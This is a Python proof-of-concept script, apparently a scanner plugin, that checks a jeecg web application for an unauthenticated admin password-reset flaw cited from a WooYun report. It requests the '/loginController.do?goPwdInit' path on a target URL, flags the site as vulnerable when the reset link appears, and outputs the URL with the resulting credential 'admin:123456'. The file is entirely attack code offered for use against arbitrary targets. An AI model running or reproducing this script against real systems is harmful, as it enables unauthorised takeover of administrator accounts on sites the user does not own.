#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: jeecg 重置admin密码
referer: http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0121463.html
author: Lucifer
description: 未授权可访问初始化方法重置。
'''
import sys
import requests
import warnings
def run(url):
        result = ['jeecg 重置admin密码','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/loginController.do?goPwdInit"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"loginController.do?pwdInit" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\tadmin:123456"
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
